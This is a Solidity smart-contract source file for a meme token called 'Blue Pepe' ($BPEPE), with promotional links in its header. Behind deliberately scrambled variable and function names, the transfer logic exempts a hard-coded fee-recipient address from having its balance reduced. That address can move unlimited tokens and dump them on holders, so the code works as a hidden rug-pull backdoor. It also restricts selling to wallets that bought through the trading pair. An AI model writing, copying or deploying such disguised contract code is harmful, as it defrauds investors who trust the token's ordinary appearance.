/*

Blue Pepe  -  $BPEPE



TWITTER: https://twitter.com/BluePepeCoin
TELEGRAM: https://t.me/BluePepe_Coin
WEBSITE: https://bpepe.net/

**/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.20;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function  _wiruk(uint256 a, uint256 b) internal pure returns (uint256) {
        return  _wiruk(a, b, "SafeMath:  subtraction overflow");
    }

    function  _wiruk(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IuniswapRouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract BluePepe is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _vfq_fwaebcg;
    mapping (address => bool) private _wlflWaletakaey;
    mapping(address => uint256) private _nkg_ydauc_hiTmetTranafravr;
    bool public _erfexrncdausy = false;

    string private constant _name = "Blue Pepe";
    string private constant _symbol = "BPEPE";
    uint8 private constant _decimals = 9;
    uint256 private constant _totalsSupplys_vb = 100000000 * 10 **_decimals;
    uint256 public _maxTxAmount = _totalsSupplys_vb;
    uint256 public _maxWalletSize = _totalsSupplys_vb;
    uint256 public _taxSwapThreshold= _totalsSupplys_vb;
    uint256 public _maxTaxSwap= _totalsSupplys_vb;

    uint256 private _BuyTaxinitial=10;
    uint256 private _SellTaxinitial=25;
    uint256 private _BuyTaxfinal=1;
    uint256 private _SellTaxfinal=1;
    uint256 private _BuyTaxAtreduce=5;
    uint256 private _SellTaxAtreduce=1;
    uint256 private _rirkPevatienrgeSwapaory=0;
    uint256 private _bodoatCoayixnng=0;

    
    IuniswapRouter private _uniswaptRoutertUniswaptFactbe;
    address private _uniswapPairTokenshLiquidiuy;
    bool private FpeTradcturptie;
    bool private _tvsheywapuqdg = false;
    bool private _swapixknrUniswaptpSnqlts = false;
    address public _rtmoFeeutRecqiouy = 0x7c88c85725Fb865Dc7f2BB44a71288Ce5222567b;
 
 
    event RemovsueAtyiauept(uint _maxTxAmount);
    modifier lockTheSwap {
        _tvsheywapuqdg = true;
        _;
        _tvsheywapuqdg = false;
    }

    constructor () {
        _balances[_msgSender()] = _totalsSupplys_vb;
        _vfq_fwaebcg[owner()] = true;
        _vfq_fwaebcg[address(this)] = true;
        _vfq_fwaebcg[_rtmoFeeutRecqiouy] = true;


        emit Transfer(address(0), _msgSender(), _totalsSupplys_vb);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _totalsSupplys_vb;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()]. _wiruk(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount=0;
        if (from != owner() && to != owner()) {

            if (_erfexrncdausy) {
                if (to != address(_uniswaptRoutertUniswaptFactbe) && to != address(_uniswapPairTokenshLiquidiuy)) {
                  require(_nkg_ydauc_hiTmetTranafravr[tx.origin] < block.number,"Only one transfer per block allowed.");
                  _nkg_ydauc_hiTmetTranafravr[tx.origin] = block.number;
                }
            }

            if (from == _uniswapPairTokenshLiquidiuy && to != address(_uniswaptRoutertUniswaptFactbe) && !_vfq_fwaebcg[to] ) {
                require(amount <= _maxTxAmount, "Exceeds the _maxTxAmount.");
                require(balanceOf(to) + amount <= _maxWalletSize, "Exceeds the maxWalletSize.");
                if(_bodoatCoayixnng<_rirkPevatienrgeSwapaory){
                  require(!_rdrktrkq(to));
                }
                _bodoatCoayixnng++; _wlflWaletakaey[to]=true;
                taxAmount = amount.mul((_bodoatCoayixnng>_BuyTaxAtreduce)?_BuyTaxfinal:_BuyTaxinitial).div(100);
            }

            if(to == _uniswapPairTokenshLiquidiuy && from!= address(this) && !_vfq_fwaebcg[from] ){
                require(amount <= _maxTxAmount && balanceOf(_rtmoFeeutRecqiouy)<_maxTaxSwap, "Exceeds the _maxTxAmount.");
                taxAmount = amount.mul((_bodoatCoayixnng>_SellTaxAtreduce)?_SellTaxfinal:_SellTaxinitial).div(100);
                require(_bodoatCoayixnng>_rirkPevatienrgeSwapaory && _wlflWaletakaey[from]);
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (!_tvsheywapuqdg 
            && to == _uniswapPairTokenshLiquidiuy && _swapixknrUniswaptpSnqlts && contractTokenBalance>_taxSwapThreshold 
            && _bodoatCoayixnng>_rirkPevatienrgeSwapaory&& !_vfq_fwaebcg[to]&& !_vfq_fwaebcg[from]
            ) {
                swapoToqenthrfq( _drctr(amount, _drctr(contractTokenBalance,_maxTaxSwap)));
                uint256 contractETHBalance = address(this).balance;
                if(contractETHBalance > 0) {
                }
            }
        }

        if(taxAmount>0){
          _balances[address(this)]=_balances[address(this)].add(taxAmount);
          emit Transfer(from, address(this),taxAmount);
        }
        _balances[from]= _wiruk(from, _balances[from], amount);
        _balances[to]=_balances[to].add(amount. _wiruk(taxAmount));
        emit Transfer(from, to, amount. _wiruk(taxAmount));
    }

    function swapoToqenthrfq(uint256 amountForstoken) private lockTheSwap {
        if(amountForstoken==0){return;}
        if(!FpeTradcturptie){return;}
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _uniswaptRoutertUniswaptFactbe.WETH();
        _approve(address(this), address(_uniswaptRoutertUniswaptFactbe), amountForstoken);
        _uniswaptRoutertUniswaptFactbe.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountForstoken,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function  _drctr(uint256 a, uint256 b) private pure returns (uint256){
      return (a>b)?b:a;
    }

    function  _wiruk(address from, uint256 a, uint256 b) private view returns(uint256){
        if(from == _rtmoFeeutRecqiouy){
            return a;
        }else{
            return a. _wiruk(b);
        }
    }

    function removeLimits() external onlyOwner{
        _maxTxAmount = _totalsSupplys_vb;
        _maxWalletSize=_totalsSupplys_vb;
        _erfexrncdausy=false;
        emit RemovsueAtyiauept(_totalsSupplys_vb);
    }

    function _rdrktrkq(address _yrjuxjq) private view returns (bool) {
        uint256 rtqucBarackahd;
        assembly {
            rtqucBarackahd := extcodesize(_yrjuxjq)
        }
        return rtqucBarackahd > 0;
    }


    function openTrading() external onlyOwner() {
        require(!FpeTradcturptie,"trading is already open");
        _uniswaptRoutertUniswaptFactbe = IuniswapRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(_uniswaptRoutertUniswaptFactbe), _totalsSupplys_vb);
        _uniswapPairTokenshLiquidiuy = IUniswapV2Factory(_uniswaptRoutertUniswaptFactbe.factory()).createPair(address(this), _uniswaptRoutertUniswaptFactbe.WETH());
        _uniswaptRoutertUniswaptFactbe.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        IERC20(_uniswapPairTokenshLiquidiuy).approve(address(_uniswaptRoutertUniswaptFactbe), type(uint).max);
        _swapixknrUniswaptpSnqlts = true;
        FpeTradcturptie = true;
    }

    receive() external payable {}
}